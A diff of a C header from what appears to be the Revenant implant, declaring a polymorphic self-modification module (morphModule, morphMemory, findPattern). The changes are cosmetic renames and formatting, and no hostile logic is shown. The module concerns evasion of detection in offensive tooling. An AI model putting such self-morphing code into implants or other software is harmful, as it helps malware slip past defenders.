@@ -1,13 +1,9 @@
-//
-// Created by 0xtriboulet on 3/4/2023.
-//
-
 #ifndef REVENANT_POLY_H
 #define REVENANT_POLY_H
 
-#include <Config.h>
+#include "Config.h"
 
-#if CONFIG_POLY
+#if CONFIG_POLYMORPHIC
 #include <windows.h>
 #include <tchar.h>
 #include <psapi.h>
@@ -63,14 +59,13 @@
 #define ASM_INSTR_SIZE_JMP_REL    0x2
 #define ASM_INSTR_SIZE_NOP        0x1
 
-VOID morphModule();
-VOID morphMemory(PBYTE pbyDst, BYTE byLength);
+void morphModule();
+void morphMemory(PBYTE pbyDst, BYTE byLength);
 PVOID rev_memcpy (PBYTE dest, PBYTE src, size_t n);
 PBYTE findPattern(PBYTE pData, SIZE_T uDataSize, PBYTE pPattern, PCHAR pszMask, SIZE_T uPatternSize);
 
 
-VOID morphModule()
-{
+void morphModule() {
     // Declare the MODULEINFO struct to store module information.
     MODULEINFO modInfo;
 
@@ -224,9 +219,8 @@ PVOID rev_memcpy (PBYTE dest, const PBYTE src, size_t n)
     return dest;
 }
 
+#else //CONFIG_POLYMORPHIC
 
-
-#else //CONFIG_POLY
 #define $$$ __asm__ (   \
     "nop"          \
 );
@@ -235,5 +229,7 @@ VOID morphModule()
 {
     return;
 }
-#endif //CONFIG_POLY
+
+#endif //CONFIG_POLYMORPHIC
+
 #endif //REVENANT_POLY_H
